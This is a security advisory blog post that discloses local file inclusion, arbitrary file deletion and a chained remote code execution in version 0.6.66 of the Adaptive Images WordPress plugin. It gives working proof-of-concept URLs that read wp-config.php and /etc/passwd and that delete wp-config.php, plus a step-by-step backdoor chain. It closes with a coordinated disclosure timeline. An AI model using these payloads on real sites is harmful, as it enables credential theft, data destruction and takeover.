---
layout: post
title:  "Adaptive images for Wordpress 0.6.66: LFI, arbitrary file deletion and RCE."
date:   2019-07-19 04:01:00 +0000
---

# LFI (Local file inclusion), Arbitrary file deletion and RCE in [Adaptive Images for WordPress](https://wordpress.org/plugins/adaptive-images/) plugin.

This plugin, developed by [Nevma](http://www.nevma.gr/) is used to serve images in Wordpress based on device resolution, allowing an on-the-fly resize.
It is useful to decrease the page load for mobile devices.

The analyzed version is **0.6.66** on a fresh WordPress installation 5.2.2.

Due to an exposed variable an unauthenticated attacker can exploit a vulnerability that can lead to a LFI (Local File Inclusion) and to Arbitrary File Deletion.

Sensible system and Wordpress file can be easily exfiltrated and the two vulnerabilities can be used to obtain RCE (Remote Command Execution).

## **INTRO**
**Adaptive Images for WordPress** serves images through a PHP script, `adaptive-images-script.php`.

All requests made to image assets that appear in specific folders (the plugin settings allow to change these folders) are redirected through this script that eventually manipulate the image before serving it.

At **line 877** the plugin settings are collected:

```php
  $settings = adaptive_images_script_get_settings();
```

This method at **line 62** checks if the `$_REQUEST['adaptive-images-settings']` is present and if not it overrides and composes it according the default configuration.

```php

    function adaptive_images_script_get_settings () {

        // Setup script settings.

        if ( ! isset( $_REQUEST['adaptive-images-settings'] ) ) {

    ...

    // Setup script settings and save the in request scope.

    $_REQUEST['adaptive-images-settings'] = array(
        'debug'          => $debug,
        'resolutions'    => $resolutions,
        'cache_dir'      => $cache_dir,
        'jpg_quality'    => $jpg_quality,
        'png8'           => $png8,
        'sharpen'        => $sharpen,
        'watch_cache'    => $watch_cache,
        'browser_cache'  => $browser_cache,
        'request_uri'    => $request_uri,
        'source_file'    => $source_file,
        'wp_content'     => $wp_content_dir,
        'client_width'   => $client_width,
        'hidpi'          => $hidpi,
        'pixel_density'  => $pixel_density,
        'resolution'     => $resolution
    );
```

At the end of the method the function simply return the `$_REQUEST['adaptive-images-settings']` variable.

```php
  return $_REQUEST['adaptive-images-settings'];
```

This logic allows any visitor to set and override the `$_REQUEST['adaptive-images-settings']` just passing it to the request.

**Having control on this variable allows an attacker to exploit two major vulnerabilities.**


## **LFI**

The parameter `$_REQUEST['adaptive-images-settings']['source_file']` allows an attacker to set in an arbitrary way the file requested that will be served from the script.

Even if it is not possible to manipulate the `Content-Type` header, the script will generate a malformed image that contains the requested file.

This vulnerability in combination with other server misconfiguration can lead to RCE (Remote Command Execution) using log poisoning technique, /proc/self/environ technique and others.



### **POC**

`http://wp-vulnerable/wp-content/uploads/2019/05/image.jpg?adaptive-images-settings[source_file]=../../../wp-config.php`

`http://wp-vulnerable/wp-content/uploads/2019/05/image.jpg?adaptive-images-settings[source_file]=/etc/passwd`

*The image used to trigger the vulnerability should exist.*

## **Arbitrary File Deletion**

The plugin contains a cache mechanism that allows the generated resized images to be saved and cached to prevent excessive resources usage.

As every cache mechanism a file should be deleted if the source is newer than the cache file.  
**This feature can be abused to delete an arbitrary file accessible from the Wordpress installation.**

On **line 977** is called the function that removes a stale cache image:

```php
    // Locate cached image.

    $cache_file = $settings['wp_content'] . '/' . $settings['cache_dir'] . '/' . $settings['resolution'] . $settings['request_uri'];



    // Check if cached image if stale and relete it if so.

    if ( file_exists( $cache_file ) ) {

        // Check if cached image is stale and delete it if so.

        if ( $settings['watch_cache'] ) {

            adaptive_images_delete_stale_cache_image( $settings['source_file'], $cache_file, $settings['resolution'] );

        }

    }
```

Every variable used in this code is controlled by the aforementioned `$_REQUEST['adaptive-images-settings']` variable.

The `adaptive_images_delete_stale_cache_image` function just checks if the `$cache_files` exists and if it is newer than the original one.

The only condition to successfully exploit this vulnerability is that the file that we pass as `$source_file` is newer than the file that
we pass as `$cache_file`.

```php
    function adaptive_images_delete_stale_cache_image ( $source_file, $cache_file, $resolution ) {

        if ( file_exists( $cache_file ) ) {

            // Check image file timestamp.

            if ( filemtime( $cache_file ) >= filemtime( $source_file ) ) {

                return $cache_file;

            }

            unlink( $cache_file );
        }

    }
```

### **POC**

Using relative paths we set as `$source_file` an image (or any other file) that exists in the website and as `$cache_file` (our target) the `wp-config.php`.  
In this way it is almost certain that the image is more recent than the target file.

Some other variables should be manipulated to pass some checks and build the correct path of the target file.

*This POC deletes the `wp-config.php`, test it carefully.*

`http://wp-vulnerable/wp-content/uploads/2019/07/image.jpeg?adaptive-images-settings[source_file]=../../../wp-content/uploads/2019/07/image.jpeg&adaptive-images-settings[resolution]=&resolution=16000&adaptive-images-settings[wp_content]=.&adaptive-images-settings[cache_dir]=../../..&adaptive-images-settings[request_uri]=wp-config.php&adaptive-images-settings[watch_cache]=1`


## **BONUS: LFI + Arbitrary file deletion = RCE**

Combining the previous two vulnerabilities an attacker can obtain a bold (and not really stealth) Remote Code Execution on the server.

This is the exploit process:

1. Dump the current wp-config.php
2. Delete the current wp-config.php
3. Install a fake WordPress alongside the real one (DB credentials are known, a random db_prefix should be chosen to not overwrite the current installation).
4. Log in the fake WordPress to patch a plugin or theme file to set up a backdoor
5. Use the backdoor to restore the previous wp-config.php and remove the fake WordPress installation from the database.

This process can be automated and executed in less than 1 minute.
During the process the website will not be reachable ([exploit](https://github.com)).

## **Time Line**

|Date | What |
|-----|------|
|2019/07/08|Vulnerability reported to plugin developer company using the email found in code. No response.|
|2019/07/11|Vulnerability reported directly to plugin developer.|
|2019/07/11|The vulnerability was verified by the plugin developer.|
|2019/07/11|A fix was released in version [0.6.7](https://wordpress.org/plugins/adaptive-images/).|
|2019/07/19|Public disclosure.|

Special thanks to Takis @ Nevma for his availability and for the quick release of the fix.
